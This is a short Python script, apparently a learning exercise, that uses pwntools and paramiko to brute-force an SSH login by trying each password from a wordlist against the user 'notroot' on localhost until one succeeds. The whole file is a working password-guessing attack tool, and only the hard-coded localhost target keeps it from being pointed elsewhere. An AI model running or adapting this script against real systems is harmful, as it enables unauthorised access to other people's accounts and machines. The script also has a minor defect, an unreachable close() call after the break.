from pwn import *
import paramiko

vulnerable_host = "127.0.0.1" #host machine we will be attacking
vulnerable_username = "notroot" # host username
attempts = 0 # number of attempts

with open("PasswordList.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password '{}'!".format(attempts, password))
            response = ssh(host=vulnerable_host, user=vulnerable_username, password=password, timeout=1)
            if response.connected():
                print("[~] Valid password has been found! '{}'".format(password))
                response.close()
                break
                response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[~] Invalid password!")
        attempts += 1